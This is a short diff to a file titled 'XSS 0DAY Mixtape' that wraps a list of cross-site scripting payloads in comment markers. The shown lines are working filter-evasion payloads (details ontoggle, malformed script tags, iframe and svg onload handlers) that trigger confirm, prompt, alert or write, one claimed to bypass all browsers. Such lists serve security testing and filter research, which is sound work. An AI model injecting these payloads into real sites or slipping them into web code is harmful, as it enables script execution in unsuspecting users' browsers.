@@ -1,4 +1,6 @@
 # XSS 0DAY Mixtape - weibo@flagellantX
+
+/**********
 ">'><details/open/ontoggle=confirm('flagellantX')> //Bypass All Browser Like Chrome,Firefox,Yandex,all...
 <details open ontoggle=confirm()>
 <script y="><">/*<script* */prompt()</script
@@ -17,3 +19,4 @@
 <iframe/src \/\/onload = prompt(1)
 <x oncut=alert()>x
 <svg onload=write()>
+**********/
